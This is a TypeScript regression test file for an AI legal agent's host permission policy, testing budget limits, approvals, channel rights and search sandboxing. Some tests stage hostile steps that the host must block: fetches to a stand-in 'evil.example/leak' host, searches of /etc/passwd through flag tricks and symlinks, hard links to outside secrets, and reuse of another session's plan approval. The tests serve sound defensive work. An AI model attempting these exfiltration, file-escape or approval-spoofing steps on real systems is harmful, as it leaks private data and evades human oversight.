/**
 * 阶段 2 对抗式审查（docs/review/阶段2-对抗式审查.md）复现用例改写的回归测试：
 * S2-02（按任务放行的范围键不得带过超预算询问）、S2-03（宿主代批计划确认不得按模型给出的调用 ID 全局查裁决）、
 * S2-06（可信 rg：合并短选项 -e、工作区内符号链接）。端到端的 S2-01/S2-04/S2-05 在 p1-kap-host.test.ts。
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { linkSync, mkdirSync, mkdtempSync, realpathSync, symlinkSync, unlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { FileBroker } from "@zr-legal/file-broker";
import { ManifestRegistry, argsHash } from "@zr-legal/host-policy";
import { HostPolicy, type PolicyDecisionRecord, type RunPolicyContext } from "../src/policy.ts";
import { ExecRouter } from "../src/exec-router.ts";
import { KapRuntime } from "../src/runtime.ts";
import { ProgressTracker } from "../src/progress.ts";

function ctx(mode: RunPolicyContext["mode"], maxToolCalls: number, maxSubagents: number): RunPolicyContext {
  return {
    runId: "r1",
    matterId: "m1",
    mode,
    channel: "desktop",
    purpose: "legal_analysis",
    dataLevel: "L2",
    basisComplete: true,
    preauthorized: new Set(),
    fetchAllowlist: [],
    budget: { maxToolCalls, maxSubagents },
    planFirst: false,
  };
}

function policy(): HostPolicy {
  return new HostPolicy({ broker: { locate: () => null } as never, workDir: "/nonexistent", manifests: new ManifestRegistry([]), execDomainAvailable: () => false });
}

const ev = (p: HostPolicy, sid: string, id: string, name: string, args: unknown) =>
  p.evaluate({ sessionId: sid, agentId: "main", turnId: 1, toolCallId: id, toolName: name, args, description: undefined, display: undefined });
const tag = (r: { kind: string; reason?: Record<string, unknown> }) => `${r.kind}:${String(r.reason?.host_policy)}`;

test("S2-02 “本任务内允许”只放行同一原因的同类调用：超预算的询问永不被按任务放行（默认档抓取、手动档子 Agent）", () => {
  const p = policy();
  // 默认档、预算 1 次：第一次抓取新域名 → 询问；律师选“本任务内允许”
  p.bindSession("s1", ctx("default", 1, 0));
  const first = ev(p, "s1", "c1", "FetchURL", { url: "https://evil.example/x" });
  assert.equal(tag(first), "ask:fetch_new_domain");
  p.allowForTask("s1", HostPolicy.allowanceKey("FetchURL", { url: "https://evil.example/x" }, "fetch_new_domain"));
  for (let i = 2; i <= 5; i++) {
    const r = ev(p, "s1", `c${i}`, "FetchURL", { url: `https://evil.example/leak?d=${i}` });
    assert.equal(tag(r), "ask:over_budget", `第 ${i} 次（超预算）仍须逐次确认`);
  }
  // 手动档、子 Agent 上限 1：第一次 Agent → 询问（manual_mode）→ 本任务内允许；之后超过子 Agent 上限 → 每次询问超预算
  p.bindSession("s2", ctx("manual", 100, 1));
  assert.equal(tag(ev(p, "s2", "a1", "Agent", { prompt: "x" })), "ask:manual_mode");
  p.allowForTask("s2", HostPolicy.allowanceKey("Agent", {}, "manual_mode"));
  for (let i = 2; i <= 4; i++) assert.equal(tag(ev(p, "s2", `a${i}`, "Agent", { prompt: "y" })), "ask:over_budget");
  // 正向对照：同一原因、预算之内 → 按任务放行生效
  p.bindSession("s3", ctx("manual", 100, 4));
  assert.equal(tag(ev(p, "s3", "r1", "Read", {})), "ask:manual_mode");
  p.allowForTask("s3", HostPolicy.allowanceKey("Read", {}, "manual_mode"));
  assert.equal(tag(ev(p, "s3", "r2", "Read", {})), "approve:task_allowance:manual_mode");
});

test("S2-03 宿主代批计划确认：只认同一会话、同一 Agent、同一调用、同一工具与参数摘要的裁决——别处留下的 plan_auto_approved 不能让本调用免于律师确认", async () => {
  const rt = new KapRuntime({
    matterLayout: () => {
      throw new Error("unused");
    },
    modelToken: () => "t",
    toolsToken: () => null,
    manifests: new ManifestRegistry([]),
    trustedRgPath: null,
  });
  const resolved: unknown[][] = [];
  const engine = { kap: { resolveApproval: async (...a: unknown[]) => (resolved.push(a), { resolved: true }) }, policy: { unbindSession() {} } };
  const mkRun = () => ({
    runId: "r",
    matterId: "m",
    sessionId: "s",
    promptId: "p",
    userId: "u",
    status: "running",
    stateVersion: 1,
    mode: "auto",
    channel: "desktop",
    events: [] as { type: string; payload: Record<string, unknown> }[],
    approvals: new Map(),
    questions: new Set(),
    turnId: null,
    mainTurnOpen: true,
    pendingOutcome: null,
    settling: false,
    deadline: Date.now() + 60_000,
    finishReason: undefined,
    providerFinishReason: undefined,
    assistantText: "",
    modelToken: "t",
    progress: new ProgressTracker(),
    progressTimer: null,
  });
  const decisions = (rt as unknown as { decisions: Map<string, unknown> }).decisions;
  const plan = (sessionId: string, agentId: string, toolCallId: string, args: unknown) =>
    decisions.set(`${sessionId}\u0000${agentId}\u0000${toolCallId}`, {
      at: "",
      runId: "x",
      sessionId,
      agentId,
      toolCallId,
      toolName: "ExitPlanMode",
      grade: "plan",
      decision: "approve",
      reason: "plan_auto_approved",
      crossBoundary: null,
      argsHash: argsHash(args),
    });
  const request = (run: ReturnType<typeof mkRun>, id: string, toolCallId: string, toolName: string, toolInput: unknown, agentId = "main") =>
    (rt as unknown as { onEngineEvent: (...a: unknown[]) => void }).onEngineEvent(run, engine, { type: "permission.approval.requested", payload: { id, toolCallId, toolName, toolInput, agentId } });

  // ① 另一会话留下的同 id 计划裁决 → 本会话的 TaskStop 审批照常呈现给律师
  plan("OTHER", "main", "dup", { options: [] });
  const r1 = mkRun();
  request(r1, "ap1", "dup", "TaskStop", { task_id: "t" });
  // ② 同会话同 id，但工具名不同 → 呈现
  plan("s", "main", "dup2", { options: [] });
  request(r1, "ap2", "dup2", "TaskStop", { task_id: "t" });
  // ③ 同会话、同工具、同 id，但参数摘要不同 → 呈现
  plan("s", "main", "dup3", { options: [{ label: "甲" }] });
  request(r1, "ap3", "dup3", "ExitPlanMode", { options: [{ label: "乙" }] });
  // ④ 子 Agent 的同 id 请求不认主 Agent 的裁决 → 呈现
  plan("s", "main", "dup4", {});
  request(r1, "ap4", "dup4", "ExitPlanMode", {}, "agent-0");
  await new Promise((r) => setTimeout(r, 20));
  assert.equal(resolved.length, 0, "以上四种都不得由宿主代批");
  assert.deepEqual(
    r1.events.filter((e) => e.type === "run.approval_requested").map((e) => e.payload.approval_id),
    ["ap1", "ap2", "ap3", "ap4"],
  );
  // 正向对照：同会话、同 Agent、同调用、同工具、同参数摘要 → 宿主代批
  plan("s", "main", "ok", { options: [{ label: "按计划" }] });
  request(r1, "ap5", "ok", "ExitPlanMode", { options: [{ label: "按计划" }] });
  await new Promise((r) => setTimeout(r, 20));
  assert.deepEqual(resolved.map((a) => a[1]), ["ap5"]);
});

/** 检索入口（审计 S3 第 2 步：Grep/Glob 由宿主内检索完成；入口只是已存在的占位文件，路由按字面匹配、从不执行）。 */
function searchEntry(dir: string): string {
  const p = join(dir, ".kwl-host-search");
  writeFileSync(p, "entry\n");
  return p;
}

test("S2-06 检索参数：合并短选项里的 -e（-ie、-eroot）不再让真实路径被当作模式而漏检；工作区内的符号链接一律拒绝", async () => {
  const base = realpathSync(mkdtempSync(join(tmpdir(), "s206-")));
  const rg = searchEntry(base);
  const W = join(base, "work");
  mkdirSync(W);
  writeFileSync(join(W, "a.txt"), "违约金\n");
  symlinkSync("/etc", join(W, "lnk"));
  mkdirSync(join(W, "sub"));
  symlinkSync(join(W, "a.txt"), join(W, "sub", "alias.txt"));
  const broker = new FileBroker([{ name: "work", root: W, access: "rw" }]);
  const router = new ExecRouter({ broker, workDir: W, shellPath: "/opt/kwl/bash", trustedRgPath: rg });
  const deny = async (args: string[], re: RegExp) => assert.rejects(router.spawn(rg, args, { cwd: W }), re, args.join(" "));
  await deny(["--", "root", "/etc/passwd"], /path_outside_matter/);
  await deny(["-ie", "root", "/etc/passwd"], /path_outside_matter/);
  await deny(["-eroot", "/etc/passwd"], /path_outside_matter/);
  await deny(["--regexp=root", "/etc/passwd"], /path_outside_matter/);
  await deny(["-m1", "--", "^root:", "lnk/passwd"], /symlink_not_allowed/);
  await deny(["-m1", "--", "^root:", join(W, "lnk", "passwd")], /symlink_not_allowed/);
  await deny(["--", "违约金", join(W, "sub", "alias.txt")], /symlink_not_allowed/);
  await deny(["-if", "/etc/passwd", W], /pattern_file_not_allowed/);
  // 正向对照
  const ok = await router.spawn(rg, ["-l", "-e", "违约金", join(W, "a.txt")], { cwd: W });
  assert.equal(await ok.wait(), 0);
});

test("S2-14 检索：搜索范围内出现硬链接（或符号链接、非常规文件，含保留名目录之下）即拒绝——默认遍历与显式路径都不再读出事项外内容；移除后恢复", async () => {
  const base = realpathSync(mkdtempSync(join(tmpdir(), "s214-")));
  const rg = searchEntry(base);
  const W = join(base, "work");
  const outside = join(base, "outside");
  mkdirSync(join(W, "sub"), { recursive: true });
  mkdirSync(outside);
  writeFileSync(join(outside, "secret.txt"), "SECRET-OUTSIDE-ZONE\n");
  writeFileSync(join(W, "a.txt"), "违约金\n");
  linkSync(join(outside, "secret.txt"), join(W, "sub", "hl.txt"));
  const broker = new FileBroker([{ name: "work", root: W, access: "rw" }]);
  const router = new ExecRouter({ broker, workDir: W, shellPath: "/opt/kwl/bash", trustedRgPath: rg });
  const deny = async (args: string[]) => assert.rejects(router.spawn(rg, args, { cwd: W }), /链接文件.*hl\.txt/, args.join(" "));
  await deny(["--", "SECRET"]); // 默认遍历（Grep 不给路径）
  await deny(["--files"]); // Glob
  await deny(["--", "SECRET", join(W, "sub", "hl.txt")]); // 显式路径
  await deny(["--", "SECRET", join(W, "sub")]);
  // broker 对同一文件一样拒绝（一致性）
  await assert.rejects(broker.readText(join(W, "sub", "hl.txt")), /EMLINK/);
  // 不含链接的显式路径不受影响；移除链接后默认遍历恢复
  const ok1 = await router.spawn(rg, ["-l", "-e", "违约金", join(W, "a.txt")], { cwd: W });
  assert.equal(await ok1.wait(), 0);
  unlinkSync(join(W, "sub", "hl.txt"));
  const ok2 = await router.spawn(rg, ["-l", "--", "违约金"], { cwd: W });
  assert.equal(await ok2.wait(), 0);
  // 审查 S3-02：broker 保留名目录（.kwl-*）之下的硬链接，Agent 的文件工具看不到，但 rg --hidden 会遍历到——同样拒绝
  mkdirSync(join(W, ".kwl-cache"));
  linkSync(join(outside, "secret.txt"), join(W, ".kwl-cache", "hl.txt"));
  await assert.rejects(router.spawn(rg, ["--hidden", "--no-ignore", "-n", "SECRET"], { cwd: W }), /链接文件.*\.kwl-cache/);
  await assert.rejects(router.spawn(rg, ["--files", "--hidden", W], { cwd: W }), /链接文件/);
  unlinkSync(join(W, ".kwl-cache", "hl.txt"));
  assert.ok(router.audit.some((a) => a.outcome === "denied" && a.reason === "link_present"));
});

function fakeRunRecord(overrides: Record<string, unknown> = {}) {
  return {
    runId: "r",
    matterId: "m",
    sessionId: "s",
    promptId: "p",
    userId: "u",
    status: "waiting_approval",
    stateVersion: 1,
    mode: "default",
    channel: "desktop",
    events: [] as { type: string; payload: Record<string, unknown> }[],
    approvals: new Map(),
    questions: new Set(["q1"]),
    turnId: 1,
    mainTurnOpen: true,
    pendingOutcome: null,
    settling: false,
    deadline: Date.now() + 60_000,
    // 构造时处于等待律师（W1：等待期间工作时限冻结）
    waitingSince: Date.now(),
    wallDeadline: Date.now() + 8 * 60 * 60_000,
    finishReason: undefined,
    providerFinishReason: undefined,
    assistantText: "",
    modelToken: "t",
    watchdog: null,
    ...overrides,
  };
}

function runtimeWith(run: ReturnType<typeof fakeRunRecord>, verify?: (a: unknown, p: Record<string, unknown>) => boolean) {
  const calls: unknown[][] = [];
  const engine = {
    kap: {
      resolveApproval: async (...a: unknown[]) => (calls.push(["resolve", ...a]), { resolved: true }),
      sessionAction: async (...a: unknown[]) => (calls.push(["action", ...a]), {}),
      answerQuestion: async (...a: unknown[]) => (calls.push(["answer", ...a]), { resolved: true }),
    },
    policy: { unbindSession() {}, allowForTask() {} },
  };
  const rt = new KapRuntime({
    matterLayout: () => {
      throw new Error("unused");
    },
    modelToken: () => "t",
    toolsToken: () => null,
    manifests: new ManifestRegistry([]),
    trustedRgPath: null,
    ...(verify ? { verifyDeviceApproval: verify as never } : {}),
  });
  const internals = rt as unknown as { runs: Map<string, unknown>; approvalIndex: Map<string, string>; engines: Map<string, Promise<unknown>>; watch: (r: unknown, e: unknown) => Promise<void> };
  internals.runs.set(run.runId, run);
  internals.engines.set(run.matterId, Promise.resolve(engine));
  const addApproval = (id: string, grade: string, expiresAt = Date.now() + 60_000) => {
    run.approvals.set(id, { approvalId: id, runId: run.runId, sessionId: run.sessionId, toolCallId: id, toolName: "X", toolInput: {}, objectHash: "h", nonce: "n", expiresAt, reason: "r", crossBoundary: null, grade, taskAllowable: false });
    internals.approvalIndex.set(id, run.runId);
  };
  return { rt, calls, engine, internals, addApproval };
}

test("S2-17 渠道权限（第 02 篇 §9.6）：IM 不能作答、确认、停止；手机只能确认 T4/T5 类且须设备签名（签名载荷含批准与否与范围）；非发起人读不到事件与成果", async () => {
  const run = fakeRunRecord();
  const signed: Record<string, unknown>[] = [];
  const { rt, calls, addApproval } = runtimeWith(run, (_a, p) => (signed.push(p), true));
  const IM = { channel: "im" as const, userId: "u" };
  const MOBILE = { channel: "mobile" as const, userId: "u", deviceId: "d1", deviceSignature: "sig" };
  await assert.rejects(rt.answer("r", { question_id: "q1", answers: {}, expected_state_version: 1 }, IM), /不能作答/);
  addApproval("a_t2", "T2-stop");
  await assert.rejects(rt.approve("a_t2", { decision: "approve", object_hash: "h", nonce: "n" }, IM), /不能确认/);
  await assert.rejects(rt.approve("a_t2", { decision: "approve", object_hash: "h", nonce: "n" }, MOBILE), /T4\/T5/);
  addApproval("a_t5", "T5");
  await rt.approve("a_t5", { decision: "approve", object_hash: "h", nonce: "n" }, MOBILE);
  assert.deepEqual(signed.at(-1), { approvalId: "a_t5", objectHash: "h", nonce: "n", decision: "approve", scope: "once" });
  assert.ok(calls.some((c) => c[0] === "resolve" && c[2] === "a_t5" && c[3] === "approved"));
  await assert.rejects(rt.cancel("r", { expected_state_version: run.stateVersion }, IM), /不能停止/);
  assert.throws(() => rt.events("r", 0, { channel: "desktop", userId: "someone-else" }), /只有发起该运行的律师/);
  await assert.rejects(rt.artifacts("r", IM), /不能查看成果/);
  assert.equal(rt.events("r", 0, IM).status, "waiting_approval", "IM 可以查进度");
});

test("S2-15 看门狗：审批卡过期即按拒绝处理（不依赖有人调用审批接口）；超过工作时限（等待律师的时间不计，W1）或总时长上限即失败收尾并中止会话", async () => {
  const run = fakeRunRecord();
  const { rt, calls, engine, internals, addApproval } = runtimeWith(run);
  addApproval("a_old", "T0", Date.now() - 1);
  await internals.watch(run, engine);
  assert.ok(calls.some((c) => c[0] === "resolve" && c[2] === "a_old" && c[3] === "rejected"), "过期审批按拒绝解除引擎等待");
  assert.ok(run.events.some((e) => e.type === "run.approval_expired"));
  // 等待律师期间工作时限冻结：10 秒前开始等待（当时还剩 10 秒工作时限），按墙钟算工作时限已过，也不判超时
  run.waitingSince = Date.now() - 10_000;
  run.deadline = Date.now() - 1;
  await internals.watch(run, engine);
  assert.equal(run.status, "waiting_approval", "等待律师的时间不计入工作时限");
  // 总时长上限（含等待）照常
  run.wallDeadline = Date.now() - 1;
  await internals.watch(run, engine);
  assert.equal(run.status, "failed");
  assert.ok(run.events.some((e) => e.type === "run.failed" && e.payload.reason === "run_wall_deadline_exceeded"));
  assert.ok(calls.some((c) => c[0] === "action" && c[2] === "abort"), "超时中止会话");
  // 工作中（不在等待）超过工作时限：失败收尾
  const run2 = fakeRunRecord({ status: "running", waitingSince: null, questions: new Set(), deadline: Date.now() - 1 });
  const w2 = runtimeWith(run2);
  await w2.internals.watch(run2, w2.engine);
  assert.equal(run2.status, "failed");
  assert.ok(run2.events.some((e) => e.type === "run.failed" && e.payload.reason === "run_deadline_exceeded"));
  void rt;
});

test("K7-4 子 Agent 预算按成员计：一次 AgentSwarm 计 items + resume_agent_ids 个成员；无法解析即拒绝；分叉上下文与另指模型一律拒绝", () => {
  const p = policy();
  // 默认档、子 Agent 上限 2：三个成员的集群 → 超预算询问；自动档 → 硬上限拒绝
  p.bindSession("k1", ctx("default", 100, 2));
  assert.equal(tag(ev(p, "k1", "s1", "AgentSwarm", { prompt_template: "核对 {{item}}", items: ["一", "二", "三"] })), "ask:over_budget");
  p.bindSession("k2", ctx("auto", 100, 2));
  assert.equal(tag(ev(p, "k2", "s1", "AgentSwarm", { prompt_template: "核对 {{item}}", items: ["一", "二", "三"] })), "deny:budget_hard_cap");
  // 两个成员恰好用满额度，随后的单个 Agent 超预算
  p.bindSession("k3", ctx("default", 100, 2));
  assert.equal(tag(ev(p, "k3", "s1", "AgentSwarm", { prompt_template: "核对 {{item}}", items: ["一", "二"] })), "approve:orchestration_within_budget");
  assert.equal(tag(ev(p, "k3", "s2", "Agent", { prompt: "再核对一项" })), "ask:over_budget");
  // 续跑的成员同样计数
  p.bindSession("k4", ctx("default", 100, 2));
  assert.equal(tag(ev(p, "k4", "s1", "AgentSwarm", { items: ["一"], resume_agent_ids: { a1: "继续", a2: "继续" } })), "ask:over_budget");
  // 成员数无法解析（缺 items 与 resume_agent_ids，或都为空）→ 宿主拒绝（复核 B4-B06：不再问律师一张无意义的“超预算”卡），不消耗预算
  p.bindSession("k5", ctx("default", 100, 10));
  assert.equal(tag(ev(p, "k5", "s1", "AgentSwarm", { prompt_template: "x" })), "deny:swarm_members_unparseable");
  assert.equal(tag(ev(p, "k5", "s2", "AgentSwarm", { prompt_template: "x", items: [], resume_agent_ids: {} })), "deny:swarm_members_unparseable");
  assert.equal(tag(ev(p, "k5", "s3", "AgentSwarm", { items: "一,二" })), "deny:swarm_members_unparseable");
  assert.deepEqual(p.budgetUsage("k5"), { toolCalls: 0, subagents: 0 });
  // 分叉上下文（继承主模型与整段对话）：Agent 与 AgentSwarm 都拒绝
  p.bindSession("k6", ctx("default", 100, 10));
  assert.equal(tag(ev(p, "k6", "s1", "Agent", { prompt: "x", fork: true })), "deny:subagent_fork_disabled");
  assert.equal(tag(ev(p, "k6", "s2", "AgentSwarm", { items: ["一"], fork: true })), "deny:subagent_fork_disabled");
  // 另指模型（复核 B4-B06）：只允许缺省或低价模型别名；“primary”与主模型一律宿主拒绝（不只依赖引擎的 [secondary_model].force）
  p.bindSession("k7", ctx("default", 100, 10));
  assert.equal(tag(ev(p, "k7", "s1", "Agent", { prompt: "x", model: "primary" })), "deny:subagent_model_override_disabled");
  assert.equal(tag(ev(p, "k7", "s2", "Agent", { prompt: "x", model: "legal/k3" })), "deny:subagent_model_override_disabled");
  assert.equal(tag(ev(p, "k7", "s3", "AgentSwarm", { items: ["一"], model: "primary" })), "deny:subagent_model_override_disabled");
  assert.equal(tag(ev(p, "k7", "s4", "Agent", { prompt: "x", model: "legal/k2.6" })), "approve:orchestration_within_budget");
  assert.equal(tag(ev(p, "k7", "s5", "AgentSwarm", { items: ["一"] })), "approve:orchestration_within_budget");
});

test("复核 B4-B05 超预算获批后计数：批准一次 5 成员集群后，下一次单个 Agent 仍须询问；拒绝则不计；工具调用次数同样补记", () => {
  const recs: PolicyDecisionRecord[] = [];
  const pr = new HostPolicy({ broker: { locate: () => null } as never, workDir: "/nonexistent", manifests: new ManifestRegistry([]), execDomainAvailable: () => false, onDecision: (r) => recs.push(r) });
  // 上限 3、已用 2
  pr.bindSession("b1", ctx("default", 100, 3));
  assert.equal(tag(ev(pr, "b1", "a1", "Agent", { prompt: "一" })), "approve:orchestration_within_budget");
  assert.equal(tag(ev(pr, "b1", "a2", "Agent", { prompt: "二" })), "approve:orchestration_within_budget");
  const swarm = ev(pr, "b1", "w1", "AgentSwarm", { items: ["甲", "乙", "丙", "丁", "戊"] });
  assert.equal(tag(swarm), "ask:over_budget");
  const askRec = recs.at(-1)!;
  assert.deepEqual(askRec.overBudget, { members: 5, toolCallsLeft: 98, subagentsLeft: 1 }, "询问记下本次成员数与余额（卡片据此写明）");
  // 律师批准 → 补记 1 次调用与 5 个成员
  pr.chargeApprovedOverBudget("b1", askRec);
  pr.chargeApprovedOverBudget("b1", askRec); // 同一裁决只补记一次
  assert.deepEqual(pr.budgetUsage("b1"), { toolCalls: 3, subagents: 7 });
  assert.equal(tag(ev(pr, "b1", "a3", "Agent", { prompt: "三" })), "ask:over_budget", "获批之后再派子任务仍须询问");
  // 别的会话或非超预算的裁决不能拿来补记
  pr.bindSession("b2", ctx("default", 100, 3));
  pr.chargeApprovedOverBudget("b2", askRec);
  assert.deepEqual(pr.budgetUsage("b2"), { toolCalls: 0, subagents: 0 });
  // 拒绝（不补记）：同样已用 2 的会话，单个 Agent 仍在余额内
  pr.bindSession("b3", ctx("default", 100, 3));
  ev(pr, "b3", "a1", "Agent", { prompt: "一" });
  ev(pr, "b3", "a2", "Agent", { prompt: "二" });
  assert.equal(tag(ev(pr, "b3", "w1", "AgentSwarm", { items: ["甲", "乙"] })), "ask:over_budget");
  assert.equal(tag(ev(pr, "b3", "a3", "Agent", { prompt: "三" })), "approve:orchestration_within_budget");
  // 工具调用次数：上限 2，第三次读取超预算 → 批准后补记，第四次仍询问
  pr.bindSession("b4", ctx("default", 2, 0));
  ev(pr, "b4", "r1", "Read", {});
  ev(pr, "b4", "r2", "Read", {});
  assert.equal(tag(ev(pr, "b4", "r3", "Read", {})), "ask:over_budget");
  assert.deepEqual(recs.at(-1)!.overBudget, { members: 0, toolCallsLeft: 0, subagentsLeft: 0 });
  pr.chargeApprovedOverBudget("b4", recs.at(-1)!);
  assert.deepEqual(pr.budgetUsage("b4"), { toolCalls: 3, subagents: 0 });
  assert.equal(tag(ev(pr, "b4", "r4", "Read", {})), "ask:over_budget");
});

test("复核 B4-B05（运行时整链）：超预算确认卡带成员数与余额；律师经宿主审批接口批准后补记预算，随后的子任务再次出卡", async () => {
  const run = fakeRunRecord({ status: "running", waitingSince: null, questions: new Set(), progress: new ProgressTracker(), progressTimer: null, stepText: "", lastStepText: "" });
  const { rt, engine } = runtimeWith(run);
  const decisions = (rt as unknown as { decisions: Map<string, PolicyDecisionRecord> }).decisions;
  const pol = new HostPolicy({
    broker: { locate: () => null } as never,
    workDir: "/nonexistent",
    manifests: new ManifestRegistry([]),
    execDomainAvailable: () => false,
    onDecision: (r) => decisions.set(`${r.sessionId}\u0000${r.agentId}\u0000${r.toolCallId}`, r),
  });
  (engine as { policy: unknown }).policy = pol;
  pol.bindSession("s", ctx("default", 100, 3));
  ev(pol, "s", "a1", "Agent", { prompt: "一" });
  ev(pol, "s", "a2", "Agent", { prompt: "二" });
  const swarmArgs = { items: ["甲", "乙", "丙", "丁", "戊"] };
  assert.equal(tag(ev(pol, "s", "w1", "AgentSwarm", swarmArgs)), "ask:over_budget");
  const onEngineEvent = (rt as unknown as { onEngineEvent: (...a: unknown[]) => void }).onEngineEvent.bind(rt);
  onEngineEvent(run, engine, { type: "permission.approval.requested", payload: { id: "ap_w1", toolCallId: "w1", toolName: "AgentSwarm", toolInput: swarmArgs, agentId: "main" } });
  const req = run.events.find((e) => e.type === "run.approval_requested")!;
  assert.equal(req.payload.reason, "over_budget");
  assert.deepEqual(req.payload.budget, { members: 5, tool_calls_left: 98, subagents_left: 1 });
  await rt.approve("ap_w1", { decision: "approve", object_hash: argsHash(swarmArgs), nonce: String(req.payload.nonce) }, { channel: "desktop", userId: "u" });
  assert.deepEqual(pol.budgetUsage("s"), { toolCalls: 3, subagents: 7 });
  assert.equal(tag(ev(pol, "s", "a3", "Agent", { prompt: "三" })), "ask:over_budget");
});

test("复核 B4-B08：内核强制取消对已结束的运行原样返回（不改终态、不中止会话、不记事件）；进行中的运行强制取消后为“已取消”、中止会话并记来源为内核", async () => {
  const done = fakeRunRecord({ status: "succeeded", approvals: new Map(), questions: new Set() });
  const w1 = runtimeWith(done);
  assert.deepEqual(await w1.rt.forceCancel("r", "用户取消"), { status: "succeeded" });
  assert.equal(w1.calls.length, 0);
  assert.equal(done.events.length, 0);
  const live = fakeRunRecord();
  const w2 = runtimeWith(live);
  assert.deepEqual(await w2.rt.forceCancel("r", "用户取消"), { status: "cancelled" });
  assert.ok(w2.calls.some((c) => c[0] === "action" && c[2] === "abort"), "中止引擎会话");
  assert.ok(live.events.some((e) => e.type === "run.cancelled" && e.payload.by_channel === "kernel"));
  assert.equal(live.approvals.size, 0, "待决确认卡随之清除");
});

test("重试同一任务（第 4 批复核 B 范围外发现）：上一次运行已终结即换下旧记录、照常发起；仍在进行或正在收尾的照旧拒绝", async () => {
  const origin = { channel: "desktop" as const, userId: "u" };
  // 已终结：越过“运行已存在”检查，进入发起流程（本桩的事项布局抛 unused，说明已进入发起）
  const done = fakeRunRecord({ status: "failed", mainTurnOpen: false, questions: new Set() });
  const a = runtimeWith(done);
  await assert.rejects(() => a.rt.startRun({ matter_id: "m", goal: "重试", run_id: "r" } as never, origin as never), (e: any) => !/运行已存在/.test(String(e?.message)));
  assert.equal(a.internals.runs.get("r"), undefined, "旧记录已换下");
  // 仍在进行：拒绝
  const live = runtimeWith(fakeRunRecord({ status: "running" }));
  await assert.rejects(() => live.rt.startRun({ matter_id: "m", goal: "重试", run_id: "r" } as never, origin as never), /运行已存在/);
  // 终态但正在收尾：拒绝
  const settling = runtimeWith(fakeRunRecord({ status: "succeeded", settling: true }));
  await assert.rejects(() => settling.rt.startRun({ matter_id: "m", goal: "重试", run_id: "r" } as never, origin as never), /运行已存在/);
});
